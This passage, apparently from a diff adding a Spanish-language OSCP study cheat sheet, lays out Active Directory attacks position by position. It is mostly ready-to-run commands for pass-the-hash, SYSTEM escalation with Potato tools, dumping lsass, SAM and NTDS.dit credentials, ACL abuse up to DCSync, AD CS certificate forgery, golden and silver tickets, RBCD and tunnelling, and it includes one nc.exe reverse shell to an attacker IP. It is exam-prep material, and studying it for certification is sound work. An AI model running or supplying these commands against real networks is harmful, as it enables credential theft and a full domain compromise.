+<span class="cmt"># SMB (445) — shell SYSTEM</span>
+impacket-psexec $DOMAIN/$USER@$IP -hashes $HASH
+impacket-wmiexec $DOMAIN/$USER@$IP -hashes $HASH     <span class="cmt"># más sigiloso, sin servicio</span>
+
+<span class="cmt"># cuenta LOCAL (ojo: dominio = nombre del host o '.')</span>
+impacket-psexec Administrator@$IP -hashes $HASH</pre></div>
+
+<h3>Overpass-the-Hash (hash NTLM → ticket Kerberos)</h3>
+<p class="why">Conviertes el hash NTLM en un TGT de Kerberos. Útil cuando NTLM está restringido pero Kerberos no, o para encadenar con ataques que necesitan un TGT. Requiere reloj sincronizado y usar el <b>hostname</b>, no la IP.</p>
+<div class="code"><pre>impacket-getTGT $DOMAIN/$USER -hashes $HASH -dc-ip $DC
+export KRB5CCNAME=$USER.ccache
+impacket-psexec -k -no-pass $DOMAIN/$USER@$DCHOST    <span class="cmt"># -k usa el ticket del KRB5CCNAME</span>
+nxc smb $DCHOST -u $USER -k --use-kcache</pre></div>
+
+<h3>Intentar crackearlo</h3>
+<p class="why">Si el hash se crackea, consigues la contraseña en claro, que suele estar reutilizada en más sitios y es más versátil que el hash. Modo 1000 de hashcat para NTLM.</p>
+<div class="code"><pre>echo "NTHASH" > nt.hash
+hashcat -m 1000 nt.hash /usr/share/wordlists/rockyou.txt</pre></div>
+
+<div class="next"><b>¿Qué conseguí?</b> Shell en un host → <a href="#p5">Posición 5</a> (o <a href="#p6">6</a> si entraste como admin/SYSTEM). &nbsp;·&nbsp; La contraseña en claro → <a href="#p3">Posición 3</a>.</div>
+</section>
+
+<!-- ============ POSICIÓN 5 ============ -->
+<section id="p5">
+<h2><span class="n">P5</span>Posición 5 · Tengo shell de USUARIO en una máquina</h2>
+<p class="lead"><b>Objetivo:</b> subir a admin local / SYSTEM en ESE host, y de paso cazar credenciales de dominio que vivan ahí. Orden: <b>privilegios del token primero</b> (SeImpersonate es el atajo más rápido), luego secretos guardados (DPAPI, historial de PowerShell), luego enumeración automática.</p>
+
+<h3>Lo primero: tus privilegios y el terreno</h3>
+<p class="why">Un solo comando (<code>whoami /priv</code>) puede ahorrarte toda la enumeración: si tienes <b>SeImpersonatePrivilege</b> o <b>SeBackupPrivilege</b>, ya tienes el camino a SYSTEM (ver abajo y Posición 6).</p>
+<div class="code"><pre>whoami /priv
+whoami /groups
+systeminfo
+ipconfig /all           <span class="cmt"># ¿otras subredes? → pivoting</span>
+netstat -ano            <span class="cmt"># servicios locales solo en 127.0.0.1</span></pre></div>
+
+<h3>SeImpersonatePrivilege → SYSTEM (Potatoes)</h3>
+<p class="why">Si tu cuenta (típico en cuentas de servicio, IIS, MSSQL) tiene <code>SeImpersonatePrivilege</code>, puedes suplantar el token de SYSTEM con un "Potato". <b>PrintSpoofer</b> y <b>GodPotato</b> son los que mejor funcionan en objetivos modernos.</p>
+<div class="code"><pre>.\PrintSpoofer64.exe -i -c cmd       <span class="cmt"># shell SYSTEM interactiva</span>
+.\PrintSpoofer64.exe -c "C:\tmp\nc.exe 10.10.14.1 443 -e cmd"
+.\GodPotato-NET4.exe -cmd "cmd /c whoami"   <span class="cmt"># si PrintSpoofer no va</span></pre></div>
+
+<h3>DPAPI — credenciales guardadas del usuario</h3>
+<p class="why">Windows guarda contraseñas (Credential Manager, navegadores, WiFi, RDP) cifradas con DPAPI, usando una clave derivada de la contraseña del usuario. Con la shell del usuario puedes descifrar sus "blobs" y recuperar credenciales de dominio frescas.</p>
+<div class="code"><pre><span class="cmt"># localizar los blobs y masterkeys (en el host)</span>
+dir /a:h C:\Users\$env:USERNAME\AppData\Local\Microsoft\Credentials\
+dir /a:h C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Credentials\
+dir /a:h C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Protect\
+
+<span class="cmt"># descifrar con impacket-dpapi (tráete los archivos a Kali o usa SMB)</span>
+impacket-dpapi masterkey -file masterkeyfile -sid S-1-5-21-... -password $PASS
+impacket-dpapi credential -file credfile -key 0xMASTERKEY
+
+<span class="cmt"># o automatizado remoto con nxc:</span>
+nxc smb $IP -u $USER -p $PASS --dpapi</pre></div>
+
+<h3>Historial de PowerShell</h3>
+<p class="why">La gente escribe contraseñas en línea de comandos. El historial de PSReadline las guarda en texto plano. Es uno de los primeros sitios que revisar y uno de los más fructíferos en el examen.</p>
+<div class="code"><pre>type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+<span class="cmt"># PowerShell:</span>
+Get-Content (Get-PSReadlineOption).HistorySavePath
+<span class="cmt"># busca también en scripts, Unattend.xml, web.config, *.config, *.ps1, *.bat</span>
+findstr /si password *.txt *.xml *.config *.ps1 2>nul</pre></div>
+
+<h3>Enumeración automática (winPEAS)</h3>
+<p class="why">Cuando lo anterior no da el salto, winPEAS barre el sistema entero en busca de misconfiguraciones (servicios, permisos, tareas, software). Córrelo, pero lee tú la salida: las pistas en rojo/amarillo son candidatas, no verdades.</p>
+<div class="code"><pre>.\winPEASx64.exe
+<span class="cmt"># vectores clásicos: servicio con binpath modificable, unquoted service path,</span>
+<span class="cmt"># AlwaysInstallElevated, tarea programada escribible, DLL hijacking.</span>
+<span class="cmt"># mira también PrivEsc Windows de tu cheatsheet general.</span></pre></div>
+
+<div class="next"><b>¿Qué conseguí?</b> SYSTEM / admin local → <a href="#p6">Posición 6</a> (volcar secretos). &nbsp;·&nbsp; Una cred de dominio nueva (DPAPI/historial) → <a href="#p3">Posición 3</a>.</div>
+</section>
+
+<!-- ============ POSICIÓN 6 ============ -->
+<section id="p6">
+<h2><span class="n">P6</span>Posición 6 · Admin local / SYSTEM en una máquina</h2>
+<p class="lead"><b>Objetivo:</b> extraer todos los secretos de ese host (hashes locales, hashes de dominio cacheados, credenciales en lsass, LAPS) y reutilizarlos en otros equipos para acercarte al DC. Admin local en un host casi nunca es el final: es munición para el siguiente salto.</p>
+
+<h3>Volcar SAM / SYSTEM / LSA (hashes locales)</h3>
+<p class="why">La SAM guarda los hashes NTLM de las cuentas <b>locales</b> (incluido el Administrator local, a menudo reutilizado en todo el dominio). Con admin local los vuelcas. La forma de examen más limpia: <code>reg save</code> + secretsdump en modo LOCAL.</p>
+<div class="code"><pre><span class="cmt"># en el host (admin): exportar las hives</span>
+reg save HKLM\SAM C:\tmp\SAM
+reg save HKLM\SYSTEM C:\tmp\SYSTEM
+reg save HKLM\SECURITY C:\tmp\SECURITY
+
+<span class="cmt"># en Kali: parsear offline</span>
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+
+<span class="cmt"># o remoto directo con nxc / secretsdump:</span>
+nxc smb $IP -u Administrator -H $HASH --local-auth --sam --lsa
+impacket-secretsdump Administrator@$IP -hashes $HASH</pre></div>
+
+<h3>Volcar lsass (credenciales en memoria)</h3>
+<p class="why">lsass.exe guarda en memoria credenciales de las sesiones activas, a veces incluyendo contraseñas en claro y tickets Kerberos de usuarios de dominio (¡incluido un admin que se haya logueado ahí!). mimikatz es el estándar; alternativamente vuelcas lsass a archivo y lo parseas en Kali con pypykatz.</p>
+<div class="code"><pre><span class="cmt"># mimikatz (en el host, como admin/SYSTEM)</span>
+.\mimikatz.exe
+  privilege::debug
+  sekurlsa::logonpasswords
+  sekurlsa::ekeys          <span class="cmt"># claves Kerberos (para overpass-the-hash)</span>
+
+<span class="cmt"># alternativa: volcar y parsear offline (evita AV a veces)</span>
+<span class="cmt"># crear el dump (Task Manager > lsass > Create dump, o comsvcs.dll)</span>
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID_lsass] C:\tmp\lsass.dmp full
+pypykatz lsa minidump lsass.dmp</pre></div>
+
+<h3>LAPS</h3>
+<p class="why">LAPS rota la contraseña del admin local de cada equipo y la guarda en un atributo LDAP (<code>ms-Mcs-AdmPwd</code>). Si tu cuenta tiene permiso de lectura sobre ese atributo, lees la contraseña local en claro de otros hosts.</p>
+<div class="code"><pre>nxc ldap $DC -u $USER -p $PASS -M laps
+<span class="cmt"># y luego usas esa contraseña como admin local del host objetivo:</span>
+nxc smb $IP -u Administrator -p 'ContraseñaLAPS' --local-auth</pre></div>
+
+<h3>SeBackupPrivilege → NTDS.dit con robocopy</h3>
+<p class="why">Si tu cuenta (o la shell) tiene <b>SeBackupPrivilege</b>, puedes leer cualquier archivo saltándote la ACL usando el flag de backup. En un DC esto te da el <code>NTDS.dit</code> (la base de datos con TODOS los hashes del dominio). <code>robocopy /B</code> copia en modo backup; si el archivo está bloqueado, usa una shadow copy.</p>
+<div class="code"><pre><span class="cmt"># copiar un archivo protegido en modo backup</span>
+robocopy /B C:\Windows\NTDS C:\tmp NTDS.dit
+<span class="cmt"># si NTDS.dit está en uso, crea una instantánea VSS primero:</span>
+diskshadow /s script.txt      <span class="cmt"># script con: set context persistent / add volume C: / create / expose</span>
+<span class="cmt"># luego copias desde la shadow con robocopy /B, más el SYSTEM hive:</span>
+reg save HKLM\SYSTEM C:\tmp\SYSTEM
+
+<span class="cmt"># en Kali: extraer todos los hashes del dominio</span>
+impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL</pre></div>
+<div class="callout good"><b>Atajo:</b> con <code>SeBackupPrivilege</code> hay utilidades <code>SeBackupPrivilegeCmdLets.dll</code> / <code>SeBackupPrivilegeUtils.dll</code> que exponen <code>Copy-FileSeBackupPrivilege</code>, por si <code>robocopy /B</code> no respeta el privilegio en tu shell.</div>
+
+<div class="next"><b>¿Qué conseguí?</b> Hash del Administrator local → <a href="#p4">Posición 4</a> (reutilízalo por la red). &nbsp;·&nbsp; Cred/hash de un usuario de dominio → <a href="#p3">P3</a> / <a href="#p4">P4</a>. &nbsp;·&nbsp; NTDS.dit del DC → <a href="#p9">Posición 9</a> (ya eres dueño del dominio).</div>
+</section>
+
+<!-- ============ POSICIÓN 7 ============ -->
+<section id="p7">
+<h2><span class="n">P7</span>Posición 7 · Tengo un permiso / ACL sobre un objeto</h2>
+<p class="lead">BloodHound te muestra que tu usuario (u otro que controlas) tiene un derecho sobre un objeto: una arista (edge). Cada edge es un ataque concreto. <b>bloodyAD</b> ejecuta la mayoría de estos abusos desde Linux con una sola línea. Identifica el edge y aplica su receta.</p>
+
+<div class="tbl"><table>
+<tr><th>Edge en BloodHound</th><th>Qué puedes hacer</th></tr>
+<tr><td><code>GenericAll</code> / <code>GenericWrite</code> sobre un USUARIO</td><td>Shadow Credentials, o resetear su contraseña, o setear un SPN y kerberoastear "targeted"</td></tr>
+<tr><td><code>GenericAll</code> sobre un GRUPO</td><td>Añadirte al grupo (AddMember)</td></tr>
+<tr><td><code>ForceChangePassword</code></td><td>Resetear la contraseña del usuario sin saber la actual</td></tr>
+<tr><td><code>WriteDacl</code> / <code>WriteOwner</code> sobre el DOMINIO</td><td>Auto-concederte derechos de DCSync</td></tr>
+<tr><td><code>AddKeyCredentialLink</code></td><td>Shadow Credentials (certipy/pywhisker)</td></tr>
+<tr><td><code>GenericAll</code> sobre un EQUIPO</td><td>RBCD, o Shadow Credentials sobre la cuenta de máquina</td></tr>
+</table></div>
+
+<h3>Resetear contraseña (GenericAll / ForceChangePassword)</h3>
+<p class="why">El abuso más directo: si controlas un usuario, le pones una contraseña nueva y entras como él. Ruidoso (le cambias la clave) pero infalible en un lab.</p>
+<div class="code"><pre>bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set password victima 'NuevaPass123!'
+<span class="cmt"># alternativas:</span>
+net rpc password "victima" "NuevaPass123!" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC
+impacket-changepasswd $DOMAIN/victima@$DC -newpass 'NuevaPass123!' -altuser $USER -altpass $PASS</pre></div>
+
+<h3>Añadirte a un grupo (GenericAll / AddMember)</h3>
+<p class="why">Si tienes derechos sobre un grupo potente (p.ej. un grupo anidado que lleva a Domain Admins), te añades como miembro y heredas sus permisos al instante.</p>
+<div class="code"><pre>bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add groupMember "GRUPO_OBJETIVO" $USER
+<span class="cmt"># alternativa:</span>
+net rpc group addmem "GRUPO_OBJETIVO" "$USER" -U "$DOMAIN"/"$USER"%"$PASS" -S $DC</pre></div>
+
+<h3>Shadow Credentials (GenericWrite / AddKeyCredentialLink)</h3>
+<p class="why">En vez de cambiar la contraseña (ruidoso), le añades al objeto una clave pública de certificado en <code>msDS-KeyCredentialLink</code>. Luego te autenticas vía PKINIT con tu clave privada y obtienes su TGT y su hash NT — sin tocar su contraseña. Requiere AD CS o al menos un DC con soporte PKINIT.</p>
+<div class="code"><pre><span class="cmt"># certipy (lo más fiable): añade la shadow cred y te devuelve TGT + hash NT</span>
+certipy shadow auto -u $USER@$DOMAIN -p $PASS -account victima -dc-ip $DC
+
+<span class="cmt"># pywhisker + gettgtpkinit (manual, por pasos)</span>
+pywhisker -d $DOMAIN -u $USER -p $PASS --target victima --action add
+
+<span class="cmt"># bloodyAD también lo hace:</span>
+bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add shadowCredentials victima</pre></div>
+
+<h3>Targeted Kerberoasting (GenericAll / GenericWrite sobre usuario)</h3>
+<p class="why">Le escribes un SPN temporal a la cuenta que controlas, la kerberoasteas para sacar su hash crackeable, y limpias el SPN. Útil cuando no quieres cambiarle la contraseña.</p>
+<div class="code"><pre>bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set object victima servicePrincipalName -v "fake/svc"
+impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request-user victima
+<span class="cmt"># luego: hashcat -m 13100 ... y borra el SPN</span></pre></div>
+
+<h3>WriteDacl sobre el dominio → DCSync</h3>
+<p class="why">Si controlas un objeto con WriteDacl/WriteOwner sobre el objeto del dominio, te auto-concedes los derechos de replicación (DS-Replication-Get-Changes), que son justo lo que DCSync necesita. Te vuelves capaz de replicar todos los hashes como si fueras un DC.</p>
+<div class="code"><pre><span class="cmt"># concederte los derechos de DCSync</span>
+bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add dcsync $USER
+<span class="cmt"># o con dacledit (impacket):</span>
+impacket-dacledit -action write -rights DCSync -principal $USER -target-dn "DC=corp,DC=local" $DOMAIN/$USER:$PASS
+<span class="cmt"># si el edge es WriteOwner: primero hazte dueño</span>
+impacket-owneredit -action write -new-owner $USER -target "Domain Admins" $DOMAIN/$USER:$PASS
+<span class="cmt"># luego DCSync → Posición 9</span>
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt</pre></div>
+
+<div class="next"><b>¿Qué conseguí?</b> Cred/hash de la víctima → <a href="#p3">P3</a>/<a href="#p4">P4</a>. &nbsp;·&nbsp; Derechos de DCSync → <a href="#p9">Posición 9</a>. &nbsp;·&nbsp; Membresía en Domain Admins → <a href="#p9">Posición 9</a>.</div>
+</section>
+
+<!-- ============ POSICIÓN 8 ============ -->
+<section id="p8">
+<h2><span class="n">P8</span>Posición 8 · Tengo acceso a un servicio con contexto</h2>
+<p class="lead">A veces el camino no pasa por una cuenta sino por un servicio: un <b>MSSQL</b> donde eres sysadmin, una <b>CA de AD CS</b> mal configurada, una app web con credenciales en su config. Cada servicio tiene su propia vía a ejecución de comandos o a un ticket.</p>
+
+<h3>MSSQL — xp_cmdshell e impersonation</h3>
+<p class="why">Si te autenticas a MSSQL (con una cred de dominio o SQL), puedes: habilitar <code>xp_cmdshell</code> para ejecutar comandos como la cuenta de servicio; impersonar a otro login si tienes <code>IMPERSONATE</code>; o capturar/relay el hash NTLM del servicio forzándolo a autenticarse contra ti.</p>
+<div class="code"><pre>impacket-mssqlclient $DOMAIN/$USER:$PASS@$IP -windows-auth
+<span class="cmt"># dentro del cliente:</span>
+  enable_xp_cmdshell
+  xp_cmdshell whoami
+  <span class="cmt"># ver logins que puedes impersonar:</span>
+  SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE';
+  EXEC AS LOGIN = 'sa';           <span class="cmt"># escalar a sysadmin si se puede</span>
+
+<span class="cmt"># con nxc (ejecutar comandos directamente):</span>
+nxc mssql $IP -u $USER -p $PASS --local-auth -x "whoami"
+nxc mssql $IP -u $USER -p $PASS -M mssql_priv    <span class="cmt"># chequea rutas de privesc</span></pre></div>
+
+<h3>AD CS — certipy (ESC1-ESC8)</h3>
+<p class="why">Active Directory Certificate Services (la PKI del dominio) suele tener plantillas mal configuradas que permiten pedir un certificado <b>a nombre de otro usuario</b> (p.ej. un Domain Admin) y usarlo para autenticarte. <code>certipy find -vulnerable</code> te lista qué ESC aplica; ESC1 es el más común en el examen.</p>
+<div class="code"><pre><span class="cmt"># 1) encontrar plantillas vulnerables</span>
+certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
+
+<span class="cmt"># 2) ESC1: pedir cert suplantando a un admin (plantilla con ENROLLEE_SUPPLIES_SUBJECT)</span>
+certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CORP-CA' -template 'VulnTemplate' -upn administrator@$DOMAIN
+
+<span class="cmt"># 3) autenticarte con el .pfx → obtienes TGT y hash NT del admin</span>
+certipy auth -pfx administrator.pfx -dc-ip $DC</pre></div>
+<div class="callout info"><b>Referencia rápida de ESCs:</b> ESC1 (subject arbitrario) · ESC2 (Any Purpose) · ESC3 (enrollment agent) · ESC4 (control sobre la plantilla → la vuelves ESC1) · ESC6 (flag EDITF_ATTRIBUTESUBJECTALTNAME2 en la CA) · ESC8 (relay NTLM al endpoint HTTP de la CA). <code>certipy find -vulnerable</code> te dice cuál.</div>
+
+<h3>App web / servicio con credenciales</h3>
+<p class="why">Una app interna (o su base de datos / archivos de config) casi siempre guarda credenciales que se reutilizan en el dominio. Es la vía "no-Kerberos": consigues una cred ahí y vuelves a la Posición 3.</p>
+<div class="code"><pre><span class="cmt"># revisa web.config, appsettings.json, connection strings, .env, cadenas de BD</span>
+findstr /si "password connectionString" *.config *.json *.xml 2>nul</pre></div>
+
+<div class="next"><b>¿Qué conseguí?</b> Shell por xp_cmdshell → <a href="#p5">Posición 5</a> (suele traer SeImpersonate → SYSTEM). &nbsp;·&nbsp; Cert/hash de un admin de dominio → <a href="#p9">Posición 9</a>. &nbsp;·&nbsp; Cred reutilizable → <a href="#p3">Posición 3</a>.</div>
+</section>
+
+<!-- ============ POSICIÓN 9 ============ -->
+<section id="p9">
+<h2><span class="n">P9</span>Posición 9 · Tengo privilegio de alto nivel en el dominio</h2>
+<p class="lead"><b>Señal:</b> eres Domain Admin, tienes derechos de replicación, o el hash de <code>krbtgt</code>. Prácticamente has ganado. <b>Objetivo:</b> volcar todos los hashes (DCSync), confirmar acceso al DC, y documentar. Golden/Silver Ticket solo si necesitas persistencia o moverte sin tocar el DC.</p>
+
+<h3>DCSync — volcar todos los hashes del dominio</h3>
+<p class="why">Con derechos de replicación le pides al DC que te "replique" los secretos como si fueras otro DC. Obtienes los hashes NT de todas las cuentas, incluido <code>krbtgt</code> (para Golden Ticket) y el Administrator del dominio.</p>
+<div class="code"><pre><span class="cmt"># solo el krbtgt y el admin (rápido, para screenshot)</span>
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user administrator
+
+<span class="cmt"># todo el dominio</span>
+impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc
+<span class="cmt"># con hash en vez de pass:</span>
+impacket-secretsdump $DOMAIN/$USER@$DC -hashes $HASH -just-dc
+
+<span class="cmt"># con nxc:</span>
+nxc smb $DC -u $USER -p $PASS --ntds</pre></div>
+
+<h3>Entrar al DC como Administrator</h3>
+<p class="why">Con el hash del Administrator del dominio (de DCSync) entras al DC por Pass-the-Hash y recoges la flag / pruebas. Este es el momento de la foto: <code>whoami</code> + <code>hostname</code> + la flag.</p>
+<div class="code"><pre>evil-winrm -i $DC -u Administrator -H NTHASH
+impacket-psexec $DOMAIN/Administrator@$DC -hashes $HASH
+type C:\Users\Administrator\Desktop\proof.txt</pre></div>
+
+<h3>Golden Ticket (persistencia con krbtgt)</h3>
+<p class="why">Con el hash de <code>krbtgt</code> forjas un TGT para cualquier usuario (incluso inexistente) con pertenencia a Domain Admins. Sobrevive a cambios de contraseña de otras cuentas. En el examen úsalo solo si lo pide el objetivo o necesitas re-acceso; para la prueba normal, DCSync + PtH basta.</p>
+<div class="code"><pre><span class="cmt"># necesitas: hash NT de krbtgt + el SID del dominio</span>
+impacket-ticketer -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-... -domain $DOMAIN administrator
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass $DOMAIN/administrator@$DCHOST</pre></div>
+
+<h3>Silver Ticket (TGS forjado para un servicio)</h3>
+<p class="why">Con el hash de una cuenta de servicio (o de máquina) forjas un TGS para <b>ese servicio concreto</b> sin hablar con el DC. Más sigiloso que el Golden y útil cuando solo quieres un servicio (CIFS, MSSQL, HTTP).</p>
+<div class="code"><pre>impacket-ticketer -nthash SERVICE_NTHASH -domain-sid S-1-5-21-... -domain $DOMAIN \
+  -spn cifs/$DCHOST administrator</pre></div>
+
+<h3>Abuso de delegación (si llegaste aquí por ahí)</h3>
+<p class="why">Tres sabores. <b>Unconstrained:</b> un host con esta flag guarda TGTs de quien se conecta — fuerza a un DC a conectarse (PrinterBug) y captura su TGT. <b>Constrained:</b> puedes pedir tickets a servicios concretos en nombre de cualquiera (S4U2Proxy). <b>RBCD:</b> si tienes GenericWrite sobre un equipo, configuras delegación hacia él y te haces admin de ese host.</p>
+<div class="code"><pre><span class="cmt"># RBCD (el más común en OSCP): tienes GenericWrite sobre el equipo objetivo</span>
+<span class="cmt"># 1) crea una cuenta de máquina que controles (MachineAccountQuota suele ser 10)</span>
+impacket-addcomputer $DOMAIN/$USER:$PASS -computer-name 'EVIL$' -computer-pass 'Evil123!' -dc-ip $DC
+<span class="cmt"># 2) configura la delegación del objetivo hacia tu cuenta</span>
+impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write $DOMAIN/$USER:$PASS
+<span class="cmt"># 3) pide un ticket de servicio impersonando a un admin</span>
+impacket-getST -spn cifs/target.$DOMAIN -impersonate administrator -dc-ip $DC $DOMAIN/'EVIL$':'Evil123!'
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass administrator@target.$DOMAIN</pre></div>
+
+<div class="callout crit"><b>No olvides documentar.</b> En el instante en que tengas SYSTEM/DA en el DC: screenshot de <code>whoami /all</code> + <code>ipconfig</code> + la(s) flag(s), y la cadena completa de comandos en tus notas. La cadena de AD vale 40 puntos y es todo-o-nada.</div>
+</section>
+
+<!-- ============ LATERAL ============ -->
+<section id="lateral">
+<h2><span class="n">L</span>Movimiento lateral y acceso remoto</h2>
+<p class="lead">Transversal a casi todas las posiciones: una vez tienes credencial o hash válido en un host, ¿cómo entras? Cada protocolo tiene su herramienta. Prueba en orden de comodidad: WinRM → wmiexec → psexec.</p>
+
+<div class="tbl"><table>
+<tr><th>Puerto / protocolo</th><th>Herramienta</th><th>Notas</th></tr>
+<tr><td>5985 WinRM</td><td><code>evil-winrm</code></td><td>La mejor shell. Necesita que el user esté en "Remote Management Users" o sea admin.</td></tr>
+<tr><td>445 SMB (servicio)</td><td><code>psexec</code></td><td>Shell SYSTEM, crea un servicio (ruidoso, deja logs).</td></tr>
+<tr><td>445 SMB (WMI)</td><td><code>wmiexec</code></td><td>Semi-interactiva, sin crear servicio. Más sigiloso.</td></tr>
+<tr><td>445 SMB (task)</td><td><code>atexec</code> / <code>smbexec</code></td><td>Vía tareas programadas / servicio temporal.</td></tr>
+<tr><td>135 DCOM</td><td><code>dcomexec</code></td><td>Alternativa cuando psexec/wmiexec fallan.</td></tr>
+<tr><td>3389 RDP</td><td><code>xfreerdp</code></td><td>GUI. Admite PtH con restricciones.</td></tr>
+</table></div>
+
+<div class="code"><pre><span class="cmt"># WinRM (con pass o con hash)</span>
+evil-winrm -i $IP -u $USER -p $PASS
+evil-winrm -i $IP -u $USER -H NTHASH
+
+<span class="cmt"># Impacket *exec (user:pass o -hashes)</span>
+impacket-wmiexec $DOMAIN/$USER:$PASS@$IP
+impacket-psexec  $DOMAIN/$USER@$IP -hashes $HASH
+impacket-atexec  $DOMAIN/$USER:$PASS@$IP "whoami"
+impacket-smbexec $DOMAIN/$USER:$PASS@$IP
+impacket-dcomexec $DOMAIN/$USER:$PASS@$IP
+
+<span class="cmt"># winrs (desde un Windows ya comprometido, sin subir nada)</span>
+winrs -r:$DCHOST -u:$DOMAIN\$USER -p:$PASS "whoami"
+
+<span class="cmt"># RDP (Pass-the-Hash necesita Restricted Admin habilitado)</span>
+xfreerdp /v:$IP /u:$USER /p:$PASS /cert:ignore +clipboard /dynamic-resolution
+xfreerdp /v:$IP /u:$USER /pth:NTHASH /cert:ignore</pre></div>
+
+<div class="callout warn"><b>Ejecutar comandos en masa:</b> <code>nxc smb 10.10.10.0/24 -u $USER -p $PASS -x "whoami"</code> (o <code>-X</code> para PowerShell) te deja lanzar un comando en todos los hosts donde eres admin de una sola vez — muy útil para cazar en qué equipo hay una sesión de admin.</div>
+</section>
+
+<!-- ============ PIVOTING ============ -->
+<section id="pivoting">
+<h2><span class="n">T</span>Pivoting y tunneling</h2>
+<p class="lead"><b>La posición transversal.</b> Si el DC o una segunda subred no se alcanzan desde Kali, no cambias de posición: montas un túnel a través del host que ya controlas y sigues atacando. <b>ligolo-ng</b> es el más cómodo; <b>chisel</b> el más socorrido cuando no hay SSH.</p>
+
+<h3>ligolo-ng (el más cómodo — interfaz tun)</h3>
+<p class="why">Crea una interfaz de red (<code>tun</code>) en Kali por la que enrutas la subred interna. No necesitas proxychains: tus herramientas usan la IP interna directamente, como si estuvieras en esa red.</p>
+<div class="code"><pre><span class="cmt"># en Kali (proxy / servidor):</span>
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+<span class="cmt"># en el host comprometido (agent):</span>
+./agent -connect 10.10.14.1:11601 -ignore-cert
+
+<span class="cmt"># en la consola de ligolo (Kali): selecciona la sesión y añade la ruta</span>
+session        <span class="cmt"># elige la sesión del agent</span>
+<span class="cmt"># en otra terminal Kali: enruta la subred interna por la interfaz ligolo</span>
+sudo ip route add 172.16.1.0/24 dev ligolo
+<span class="cmt"># en ligolo:</span>
+start          <span class="cmt"># ahora alcanzas 172.16.1.x directamente con cualquier herramienta</span></pre></div>
+
+<h3>chisel (SOCKS sin SSH)</h3>
+<p class="why">Cuando no hay SSH en el objetivo. Levantas un servidor en Kali y el cliente en el host comprometido crea un proxy SOCKS inverso. Luego diriges las herramientas por ese SOCKS con proxychains.</p>
+<div class="code"><pre><span class="cmt"># Kali (servidor):</span>
+./chisel server -p 9001 --reverse
+<span class="cmt"># objetivo (cliente) — crea un SOCKS inverso en el 1080 de Kali:</span>
+./chisel client 10.10.14.1:9001 R:socks</pre></div>
+
+<h3>SSH port forwarding</h3>
+<p class="why">Si tienes credenciales SSH, es el túnel más limpio y sin binarios. Dynamic (-D) crea un SOCKS; Local (-L) expone un puerto interno concreto en tu Kali.</p>
+<div class="code"><pre>ssh -D 1080 user@$IP                       <span class="cmt"># SOCKS en 127.0.0.1:1080</span>
+ssh -L 3389:172.16.1.5:3389 user@$IP       <span class="cmt"># RDP interno → tu puerto 3389</span>
+<span class="cmt"># dirección inversa (si el objetivo no puede recibir conexiones salientes libres):</span>
+ssh -R 1080 user@kali</pre></div>
+
+<h3>proxychains</h3>
+<p class="why">Enruta cualquier herramienta TCP por el SOCKS que montaste (chisel/ssh). Configura el puerto en <code>/etc/proxychains4.conf</code> y antepón <code>proxychains</code>.</p>
+<div class="code"><pre><span class="cmt"># /etc/proxychains4.conf  →  socks5 127.0.0.1 1080</span>
+proxychains nxc smb 172.16.1.0/24 -u $USER -p $PASS
+proxychains impacket-psexec $DOMAIN/$USER@172.16.1.5 -hashes $HASH
+proxychains xfreerdp /v:172.16.1.5 /u:$USER /p:$PASS</pre></div>
+<div class="callout info"><b>Con ligolo no necesitas proxychains:</b> por eso es el favorito en el examen. Reserva chisel+proxychains para cuando ligolo no conecte (firewall, binario bloqueado).</div>
+</section>
+
+<!-- ============ PERSISTENCIA ============ -->
+<section id="persist">
+<h2><span class="n">Z</span>Post-explotación y persistencia en el DC</h2>
+<p class="lead">Una vez dueño del dominio, esto es lo que conviene recoger y (si el objetivo lo pide) cómo mantener acceso. En el OSCP la persistencia rara vez puntúa — prioriza las flags y la documentación — pero conoce las técnicas por si una máquina las requiere.</p>
+<ul class="notes">
+  <li><b>Recoge todas las flags:</b> <code>proof.txt</code>/<code>local.txt</code> en los escritorios de cada usuario y Administrator de cada host de la cadena.</li>
+  <li><b>Vuelca todo el NTDS</b> (ya lo tienes de DCSync) por si necesitas crackear más cuentas para pivotar a otra máquina de la red.</li>
+  <li><b>Golden Ticket</b> (ver <a href="#p9">P9</a>) como persistencia: con el krbtgt entras cuando quieras aunque cambien contraseñas.</li>
+  <li><b>DCSync "ligero":</b> concede a un usuario normal derechos de replicación (bloodyAD <code>add dcsync</code>) para re-volcar sin ser DA.</li>
+</ul>
+<div class="code"><pre><span class="cmt"># confirmar dominio dominado y recoger pruebas</span>
+nxc smb $DC -u Administrator -H $HASH --ntds        <span class="cmt"># todos los hashes</span>
+evil-winrm -i $DC -u Administrator -H NTHASH
+  Get-ChildItem C:\Users\*\Desktop\*.txt            <span class="cmt"># recoge flags</span></pre></div>
+</section>
+
+<!-- ============ ATASCADO ============ -->
+<section id="atascado">
+<h2><span class="n">SOS</span>Cuando algo no funciona (síntoma → causa)</h2>
